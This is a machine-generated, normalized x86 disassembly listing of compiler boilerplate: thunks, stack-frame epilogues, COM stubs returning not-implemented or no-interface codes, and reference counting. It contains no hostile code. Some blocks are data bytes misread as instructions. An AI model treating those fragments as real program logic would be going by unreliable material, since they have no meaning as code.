sub_477a93
jmp sub_403980
sub_477a9a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_477bb8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
retn
sub_477d31
jmp sub_403980
sub_477d38
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_477d40
push 0x0
xor ecx ecx
call sub_477c6c
retn
sub_477d4c
xor ecx ecx
mov edx 0x20
call sub_402bf8
retn
sub_47800a
jmp sub_403980
sub_478011
pop ebp
retn
sub_478091
jmp sub_403980
sub_478098
pop ebp
retn
sub_47809c
sub [ rw-data ] 0x1
retn
sub_47812f
add [ esp + 0x4 ] 0xfffffff0
jmp sub_478928
sub_478139
add [ esp + 0x4 ] 0xfffffff0
jmp sub_40594c
sub_478143
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405974
sub_47814d
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405988
sub_4781f9
add eax 0xffffffe0
jmp sub_478e3c
sub_478201
add [ esp + 0x4 ] 0xffffffe0
jmp sub_40594c
sub_47820b
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405974
sub_478215
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405988
sub_47821f
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_47822b
add [ esp + 0x4 ] 0xffffffdc
jmp sub_40594c
sub_47823f
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405988
sub_478321
add [ esp + 0x4 ] 0xffffffe0
jmp sub_40594c
sub_47832b
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405974
sub_478335
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405988
sub_47833f
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_47834b
add [ esp + 0x4 ] 0xffffffdc
jmp sub_40594c
sub_478355
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405974
sub_47835f
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405988
sub_478637
jmp sub_403980
sub_47863e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47869e
jmp sub_403980
sub_4786a5
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4786ef
jmp sub_403980
sub_4786f6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478756
jmp sub_403980
sub_47875d
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4787e4
cmp [ eax + 0x18 ] 0x0
jne r-xdata
retn
call sub_478874
sub_478858
jmp sub_403980
sub_47885f
pop ebx
pop ecx
pop ebp
retn
sub_478874
push ebx
mov ebx eax
lea ecx [ ebx + 0x10 ]
mov edx r-xdata
mov eax [ ebx + 0xc ]
call sub_4774ac
lea eax [ ebx + 0xc ]
call sub_4058a0
pop ebx
retn
j_sub_4036cc#7
jmp sub_4036cc
sub_478910
call sub_478528
mov ebx eax
call sub_403a34
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_478928
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_478ae7
jmp sub_403980
sub_478b14
jmp sub_403980
sub_478b1b
pop ebx
mov esp ebp
pop ebp
retn
sub_478c89
jmp sub_403980
sub_478cb6
jmp sub_403980
sub_478e09
jmp sub_403980
sub_478e10
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478e82
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub_478e8b
jmp sub_403980
j_sub_478e82
jmp sub_478e82
sub_478e92
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478f52
jmp sub_403980
sub_478f59
pop ecx
pop ecx
pop ebp
retn
sub_479015
jmp sub_403980
sub_4790f9
jmp sub_403980
sub_479125
jmp sub_403980
sub_4791ec
retn
sub_4792ee
jmp sub_403980
sub_479440
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
pop ebx
retn
sub_479496
jmp sub_403980
sub_47949d
pop ecx
pop ebp
retn
sub_4794fe
jmp sub_403980
sub_479505
pop ecx
pop ebp
retn
sub_479508
retn
sub_4795c3
jmp sub_403980
sub_4795ca
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47961f
jmp sub_403980
sub_479626
pop ebx
pop ecx
pop ebp
retn 0x4
sub_47966b
jmp sub_403980
sub_479672
pop ebx
pop ecx
pop ebp
retn 0x4
sub_479768
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
retn
push ecx
push edx
push eax
call [ rw-data ]
retn
sub_47980b
jmp sub_403980
sub_479812
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_479871
jmp sub_403980
sub_479878
pop ebp
retn
sub_47987c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
push eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_427b2c
call sub_479678
sub_4798ed
jmp sub_403980
sub_4798f4
pop ebp
retn
sub_4798f8
sub [ rw-data ] 0x1
retn
sub_479901
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47a2f0
sub_47990b
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47a300
sub_479915
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47a314
sub_47991f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47a320
sub_479929
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47a260
sub_479933
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47a2c8
sub_47993d
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47a2dc
sub_47a192
jmp sub_403980
sub_47a199
pop ebx
pop ecx
pop ebp
retn
sub_47a1fd
jmp sub_403980
sub_47a204
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47a23c
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403550
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_47a2b7
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
sub_47a2c8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_47c578
pop ebp
retn 0x4
sub_47a2dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_47c590
pop ebp
retn 0x4
sub_47a2f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
sub_47a300
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_47a314
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
j_sub_4036cc#6
jmp sub_4036cc
sub_47a8ff
jmp sub_4036cc
sub_47a934
jmp sub_403980
sub_47a93b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47aaf6
jmp sub_403980
sub_47aafd
mov esp ebp
pop ebp
retn
j_sub_4036cc#5
jmp sub_4036cc
sub_47abe6
jmp sub_403980
sub_47abed
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4036cc#4
jmp sub_4036cc
sub_47ad1e
call sub_403a34
pop edi
pop esi
pop ebx
pop ebp
retn
j_sub_4037f8#2
jmp sub_4037f8
sub_47adae
add [ eax ] eax
add [ eax ] al
sub [ edx + 0x40 ] dh
add [ edx - 0x76ffb853 ] bh
retn
sub_47ae9c
push ebx
mov ebx eax
mov eax [ ebx + 0x214 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x214 ] eax
sub_47af08
call sub_47afb4
retn
sub_47af10
add esp 0xffffffe8
lea ecx [ esp + 0x8 ]
call sub_47b11c
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
retn
sub_47af94
push ebx
add esp 0xfffffff0
mov ebx ecx
mov ecx esp
call sub_47b11c
mov eax ebx
mov edx [ esp + 0x8 ]
call sub_4058b8
add esp 0x10
pop ebx
retn
sub_47b018
add esp 0xfffffff0
mov ecx esp
call sub_47b11c
mov ax [ esp + 0x8 ]
add esp 0x10
retn
sub_47b0fa
jmp sub_403980
sub_47b101
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b19e
jmp sub_403980
sub_47b1a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b1ac
add esp 0xfffffff0
mov ecx esp
call sub_47b11c
mov ax [ esp + 0x8 ]
add esp 0x10
retn
sub_47b20e
jmp sub_403980
sub_47b215
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b497
jmp sub_4036cc
j_sub_4036cc#3
jmp sub_4036cc
sub_47b592
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_4759fc
call sub_403a34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b5b0
retn
sub_47b701
jmp sub_403980
sub_47b708
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47b712
jmp sub_4036cc
sub_47b717
mov eax [ ebp - 0x4 ]
call sub_47ae9c
call sub_403a34
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47b7d4
call sub_47b824
retn
sub_47b7dc
call sub_47b824
retn
sub_47b80c
add esp 0xfffffff0
mov [ esp ] 0x9
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_47baf4
add esp 0x10
retn
sub_47b824
add esp 0xfffffff0
mov [ esp ] 0x3
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_47baf4
add esp 0x10
retn
sub_47b8e2
jmp sub_403980
sub_47b8e9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47b8f0
add esp 0xfffffff0
mov [ esp ] 0xb
test cx cx
je r-xdata
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x8 ] 0xffff
jmp r-xdata
mov ecx esp
call sub_47baf4
add esp 0x10
retn
sub_47b91c
call sub_47baf4
retn
j_sub_4036cc#2
jmp sub_4036cc
sub_47b9f4
jmp sub_403980
sub_47b9fb
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47bac9
jmp sub_403980
sub_47bae6
jmp sub_403980
sub_47baed
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47bb9b
jmp sub_403980
sub_47bba2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47bbac
add esp 0xfffffff0
mov [ esp ] 0x2
mov [ esp + 0x8 ] cx
mov ecx esp
call sub_47baf4
add esp 0x10
retn
sub_47bc18
jmp sub_403980
sub_47bc1f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403980#9
jmp sub_403980
sub_47bccd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036cc
jmp sub_4036cc
sub_47bef8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4759fc
call sub_403a34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c098
jmp sub_403980
sub_47c09f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c0c2
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_47ae9c
sub_47c0bb
jmp sub_403980
j_sub_4037f8
jmp sub_4037f8
sub_47c0d1
add [ eax ] eax
add [ eax ] al
sub [ edx + 0x40 ] dh
add ch bl
rol [ edi ] 0x89
retn
sub_47c269
jmp sub_403980
sub_47c2f3
jmp sub_403980
j_sub_403980#8
jmp sub_403980
sub_47c3f5
jmp sub_403980
sub_47c3fc
mov esp ebp
pop ebp
retn
sub_47c578
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_47c590
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_47c5a8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_47c5b4
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x10
xor edx edx
mov [ eax ] edx
sub_47c5cc
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004002
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_47c5e4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_47b260
xor eax eax
pop ebp
retn 0x4
sub_47c5f8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_47c6a8
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x4
sub_47c778
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0xc
sub_47c7d4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_47c920
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x230 ]
call sub_4058a0
lea eax [ ebx + 0x22c ]
call sub_4058a0
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_47c9a8
push ebp
mov ebp esp
mov eax 0x800401a1
pop ebp
retn 0x8
sub_47c9d8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_45c194
mov edx [ ebp + 0xc ]
mov [ edx ] eax
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_47ca94
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_47caa0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_47caac
push ebp
mov ebp esp
mov eax 0x1
pop ebp
retn 0xc
sub_47cadc
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_47cb38
aas
int3
sub_47cd2c
jmp sub_403980
j_sub_403980#7
jmp sub_403980
j_sub_403980#6
jmp sub_403980
sub_47ce51
jmp sub_403980
j_sub_4037f8#4
jmp sub_4037f8
sub_47ce90
jmp sub_403980
sub_47ce97
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47cea4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_47ceb0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
sub_47cebc
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
j_sub_403980#5
jmp sub_403980
sub_47cf00
pop ebp
retn
sub_47cf4c
jmp sub_403980
sub_47cf53
pop ebp
retn
sub_47d00b
add [ esp + 0x4 ] 0xfffffff4
jmp sub_47d388
sub_47d015
add [ esp + 0x4 ] 0xfffffff4
jmp sub_47d39c
sub_47d029
add [ esp + 0x4 ] 0xfffffff4
jmp sub_47d2d4
sub_47d03d
add [ esp + 0x4 ] 0xfffffff4
jmp sub_47d358
sub_47d2a8
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403550
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_47d378
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
sub_47d388
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_47d39c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_47d527
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4051c0
retn
j_sub_403980#4
jmp sub_403980
j_sub_47d527
jmp sub_47d527
sub_47d53d
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_47d548
xor edx edx
mov [ eax + 0x4 ] edx
test edx edx
je r-xdata
mov al 0x1
retn
xor eax eax
retn
sub_47d620
retn
sub_47d76e
jmp sub_403980
sub_47d775
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47d77c
push ebx
mov ebx eax
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov al [ ebx + 0x48 ]
pop ebx
retn
mov al 0x3
pop ebx
retn
sub_47d790
mov [ eax + 0x48 ] dl
retn
sub_47d794
push ebx
mov ebx eax
mov eax ebx
call sub_47d77c
cmp al 0x4
jne r-xdata
mov al [ ebx + 0x40 ]
pop ebx
retn
xor eax eax
pop ebx
retn
sub_47d7ac
mov [ eax + 0x40 ] dl
retn
sub_47d7d8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_47d7e8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
j_sub_403980#3
jmp sub_403980
sub_47d824
pop ebp
retn
sub_47d828
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418444
sub_47f908
push ebp
mov ebp esp
nop
nop
call GetLastError
nop
nop
pop ebp
retn
j_sub_403980#2
jmp sub_403980
sub_47fad4
pop ebp
retn
sub_47fc76
retn
j_sub_403980
jmp sub_403980
j_sub_47fc76
jmp sub_47fc76
sub_47fc7e
pop ebp
retn
